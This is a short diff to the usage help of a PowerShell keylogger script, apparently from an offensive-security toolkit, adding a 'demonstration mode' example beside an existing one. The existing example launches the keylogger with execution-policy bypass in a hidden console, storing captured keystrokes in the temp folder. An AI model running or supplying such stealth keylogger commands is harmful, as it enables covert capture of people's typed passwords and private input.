@@ -11,6 +11,10 @@
    Standalone Powershell script to capture keyboard keystrokes and store leaks on `$env:tmp
 
 .EXAMPLE
+   PS C:\> powershell -file keylooger.ps1
+   Start Capturing keyboard keystrokes in demonstration mode
+
+.EXAMPLE
    PS C:\> powershell -exec bypass -w 1 -file keylooger.ps1
    Start Capturing keyboard keystrokes in an hidden terminal console
 
